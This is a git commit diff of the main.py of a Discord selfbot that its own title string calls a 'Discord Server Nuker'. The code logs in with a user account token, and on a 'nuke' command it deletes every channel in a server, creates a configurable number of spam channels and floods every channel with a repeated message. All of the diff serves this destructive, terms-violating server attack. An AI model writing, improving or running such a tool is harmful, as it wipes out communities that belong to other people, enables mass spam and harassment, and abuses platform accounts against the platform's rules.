448a7b7778d3eb4152580c157fae1ff47dd1689e
blob#0005 <88004068+blob0005@users.noreply.github.com>
2022-09-19 17:23:32 +0200

    Update main.py

--- Discord Selfbot/main.py
+++ Discord Selfbot/main.py
@@ -1,28 +1,49 @@
-print("Version 1.7.3 Is The Required Version In Discord.py, Press Enter To Start The Main Program")
-input("")
-anyerror = False
+import sys, time, threading
+def print015(text):
+    for c in text:
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.015)
+    sys.stdout.write("\n")
+
+def print01(text):
+    for c in text:
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.015)
+
+
 try:
-  import discord
-  from discord.ext import commands
-  import colorama
+    import colorama, requests, discord
+    from discord.ext import commands
 except:
-  anyerror = True
-if anyerror == True:
-  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
-  input("")
-  try:
+    sys.stdout.write("> ")
+    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
+    input("")
     import os
-    os.system("pip install discord==1.7.3")
-    os.system("pip install discord.py==1.7.3")
-    os.system("pip install colorama")
-    print("Problems Should Be Fixed Now, Restart The Program")
+    try:
+        os.system("pip install colorama requests discord==1.7.3")
+    except:
+        pass
+    sys.stdout.write("> ")
+    print015("Problem Maybe Fixed Now, Restart The Program")
     input("")
     exit()
-  except:
-    print("Error While Fixing, Sorry")
-    input("")
-    exit()
+
 colorama.init(autoreset=True)
+
+try:
+    import os
+    from os import system
+    system("title " + "Discord Server Nuker,   Made By blob#0005,   Github: github.com/blob0005")
+except:
+    pass
+
+
+sys.stdout.write(colorama.Fore.CYAN + "> ")
+print01("Version 1.7.3 Is The Required Version In Discord.py, Press Enter To Start The Main Program")
+input("")
+
 import json
 try:
   json_data = open("settings.json")
@@ -35,32 +56,25 @@ try:
   token = str(json_data["account_token"])
   msg = str(json_data["message_to_spam"])
   amount_of_messages_to_send_in_each_channel = int(json_data["amount_of_messages_to_send_in_each_channel"])
-except Exception as e:
-  print('Missing "settings.json" File, It Stores All Settings')
+except:
+  sys.stdout.write(colorama.Fore.RED + "> ")
+  print01('Missing "settings.json" File, It Stores All Settings')
   input("")
   exit()
 
-try:
-    import os
-    from os import system
-    system("title " + "Discord Nuker,   Made By blob#0005,   Github: github.com/blob0005")
-except:
-    pass
-intents = discord.Intents.default()
-intents.members = True
-
-bot = commands.Bot(intents=intents, command_prefix=prefix, self_bot=True)
 
 
-
-
-
-
-
-
+#Bot Code
+sys.stdout.write(colorama.Fore.CYAN + "> ")
+print("Starting Bot...")
+colorama.init(autoreset=True)
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
 @bot.event
 async def on_ready():
-    print("Nuker Is Online!")
+  sys.stdout.write(colorama.Fore.CYAN + "> ")
+  print015(f"{bot.user.name} Is Up")
+
+
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -73,34 +87,41 @@ async def nuke(ctx):
   msga = 0
   try:
     await ctx.message.delete()
-    print(colorama.Fore.GREEN + "Deleted Nuke Message")
+    sys.stdout.write(colorama.Fore.CYAN + "> ")
+    print("Deleted Nuke Message")
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
             channela = int(channela) + 1
-            print(colorama.Fore.GREEN + f"[{str(channela)}] Deleted Channel")
+            print( f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(channela)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Deleted Channel")
         except:
-            print(colorama.Fore.RED + "Error While Deleting Channel")
+            sys.stdout.write(colorama.Fore.RED + "> ")
+            print("Error While Deleting Channel")
     for u in range(int(amount_of_channels_to_create)):
         try:
             await ctx.guild.create_text_channel(channel_names)
             guilda = int(guilda) + 1
-            print(colorama.Fore.GREEN + f"[{str(guilda)}] Created Guild")
+            print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(guilda)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Created Channel")
         except:
-            print(colorama.Fore.RED + "Error While Creating Guild")
+            sys.stdout.write(colorama.Fore.RED + "> ")
+            print("Error While Creating Channel")
     for channel in ctx.guild.channels:
         for u in range(amount_of_messages_to_send_in_each_channel):
             try:
                 await channel.send(msg)
                 msga = int(msga) + 1
-                print(colorama.Fore.GREEN + f"[{str(msga)}] Sent Message")
+                print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(msga)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Sent Message")
             except:
-                print(colorama.Fore.RED + "Error While Sending Message")
+                sys.stdout.write(colorama.Fore.RED + "> ")
+                print("Error While Sending Message")
+    sys.stdout.write(colorama.Fore.CYAN + "> ")
     print(f"Done Nuking {ctx.guild.id}/{ctx.guild.name}")
-  except Exception:
-    print(colorama.Fore.RED + "[-] Rate Limited/Missing Permission/Unkown Error")
-
-
-
-
+  except Exception as e:
+      embed = discord.Embed(
+          title="Error",
+          description="Missing Permission/Rate Limited/Unkown Error"
+      )
+      await ctx.send(embed=embed)
+      sys.stdout.write(colorama.Fore.RED + "> ")
+      print015("Missing Permission/Rate Limited/Unkown Error")
 bot.run(token, bot=False)
